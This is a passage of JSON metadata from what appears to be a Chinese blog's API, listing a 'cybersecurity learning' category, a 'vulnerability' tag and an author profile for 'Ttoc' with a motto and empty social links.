mins."},"categories":[{"name":"网络安全学习","slug":"网络安全学习","count":26,"path":"api/categories/网络安全学习.json"}],"tags":[{"name":"漏洞","slug":"漏洞","count":2,"path":"api/tags/漏洞.json"}],"author":{"name":"Ttoc","slug":"blog-author","avatar":"/static/img/logo.png","link":"/","description":"必须从过去的错误学习教训，而非依赖过去的成功","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}}}}